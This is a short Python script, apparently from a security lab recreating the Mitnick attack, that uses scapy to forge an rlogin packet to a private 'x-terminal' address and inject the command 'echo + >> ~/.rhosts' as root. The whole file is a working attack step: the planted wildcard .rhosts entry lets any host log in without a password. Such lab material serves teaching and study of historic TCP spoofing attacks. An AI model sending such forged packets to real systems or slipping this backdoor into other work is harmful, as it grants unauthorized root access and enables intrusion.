#!/usr/bin/env python3
from scapy import *

# Define the command to be executed on the x-terminal
command = "echo + >> ~/.rhosts"

# Define the rlogin packet to be sent
pkt = (
    IP(dst="172.28.1.2")
    / TCP(sport=513, dport=513)
    / ("fontoura\0root\0" + command + "\0")
)

# Send the modified packet
send(pkt)
